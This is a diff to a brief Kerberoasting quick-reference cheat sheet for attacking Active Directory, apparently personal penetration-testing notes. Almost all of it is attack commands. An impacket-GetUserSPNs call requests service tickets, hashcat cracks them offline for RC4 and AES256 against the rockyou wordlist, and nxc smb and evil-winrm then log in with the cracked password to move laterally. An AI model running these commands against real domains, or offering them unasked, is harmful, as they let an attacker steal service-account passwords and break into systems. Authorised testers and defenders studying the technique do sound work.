@@ -1,18 +1,16 @@
-KERBEROASTING - QUICK REF
+KERBEROASTING — QUICK REF
 
 Requires: valid low-priv domain credentials
 
-1.  List kerberoastable accounts:
-    GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc-ip>
+1.  Find SPNs + request tickets (one command):
+    impacket-GetUserSPNs -request -dc-ip <dc-ip> <domain>/<user>:<pass> -outputfile kerberoasting.hashes
 
-2.  Dump TGS tickets to file:
-    GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc-ip> -request -outputfile <hash-file>
+2.  Crack — RC4 (mode 13100, $krb5tgs$23$...):
+    hashcat -m 13100 kerberoasting.hashes /usr/share/wordlists/rockyou.txt
 
-3a. Crack RC4 tickets (hashcat):
-    hashcat -m 13100 <hash-file> <wordlist-path> --force
-3b. Crack AES256 tickets (hashcat):
-    hashcat -m 19700 <hash-file> <wordlist-path> --force
-3c. John:
-    john --format=krb5tgs --wordlist=<wordlist-path> <hash-file>
+    Crack — AES256 (mode 19700, $krb5tgs$18$...):
+    hashcat -m 19700 kerberoasting.hashes /usr/share/wordlists/rockyou.txt
 
-4.  Use cracked plaintext password to authenticate / pivot
+3.  Use cracked password:
+    nxc smb <ip> -u <user> -p <cracked-pass>
+    evil-winrm -i <ip> -u <user> -p <cracked-pass>
